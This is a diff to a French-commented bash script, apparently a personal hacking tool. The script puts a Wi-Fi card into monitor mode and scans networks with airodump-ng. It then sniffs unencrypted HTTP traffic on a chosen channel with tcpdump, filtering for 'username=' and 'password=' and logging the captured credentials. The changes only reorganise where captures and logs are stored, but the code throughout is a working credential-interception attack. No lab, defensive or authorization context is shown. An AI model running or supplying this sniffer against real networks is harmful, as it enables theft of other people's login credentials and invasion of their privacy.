@@ -84,12 +84,16 @@ else
     echo "[✅] Mode monitor activé sur : $MONITOR_INTERFACE"
 fi
 
+# Création du dossier captures s'il n'existe pas
+CAPTURES_DIR="$SCRIPT_DIR/captures"
+mkdir -p "$CAPTURES_DIR"
+
 # Supprime les anciens fichiers de scan
-rm -f networks-01.csv
+rm -f "$CAPTURES_DIR/networks-"*.csv
 
 # Scan des réseaux Wi-Fi avec `airodump-ng`
 echo "[🔍] Scan des réseaux Wi-Fi en cours..."
-sudo airodump-ng --output-format csv -w networks "$MONITOR_INTERFACE" --write-interval 1 > /dev/null 2>&1 &
+sudo airodump-ng --output-format csv -w "$CAPTURES_DIR/networks" "$MONITOR_INTERFACE" --write-interval 1 > /dev/null 2>&1 &
 
 # Effet de chargement (7 secondes)
 echo -ne "[🔄] Attente du scan"
@@ -103,7 +107,7 @@ echo ""
 sudo pkill airodump-ng
 
 # Vérifie si le fichier de scan a été généré
-if [ ! -f networks-01.csv ]; then
+if [ ! -f "$CAPTURES_DIR/networks-01.csv" ]; then
     echo "[❌] Aucun réseau détecté. Vérifie que la carte est bien en mode monitor."
     exit 1
 fi
@@ -129,7 +133,7 @@ NR>2 {
     }
 
     printf "Canal: %-3s | Sécurité: %-4s | SSID: %s\n", canal, security, ssid
-}' networks-01.csv | column -t
+}' "$CAPTURES_DIR/networks-01.csv" | column -t
 
 # Demande à l'utilisateur de choisir un canal
 echo ""
@@ -140,11 +144,11 @@ sudo iw dev "$MONITOR_INTERFACE" set channel "$CANAL"
 echo "[✅] Surveillance du canal $CANAL..."
 
 # Lancer la capture avec tcpdump et afficher un message si aucun paquet intéressant n'est capturé
-rm -f capture.log interesting.log
+rm -f "$LOG_DIR/capture.log" "$LOG_DIR/interesting.log"
 echo "[📡] Capture en cours... (Appuie sur CTRL+C pour arrêter)"
-sudo tcpdump -l -i "$MONITOR_INTERFACE" -n -s 0 -A port 80 | tee capture.log | grep --line-buffered -E "username=|password=" | tee interesting.log
+sudo tcpdump -l -i "$MONITOR_INTERFACE" -n -s 0 -A port 80 | tee "$LOG_DIR/capture.log" | grep --line-buffered -E "username=|password=" | tee "$LOG_DIR/interesting.log"
 
-if [ ! -s interesting.log ]; then
+if [ ! -s "$LOG_DIR/interesting.log" ]; then
     echo "[INFO] La capture sur le port 80 a bien eu lieu, mais aucun paquet ne correspond au filtre 'username=' ou 'password='."
 fi
 
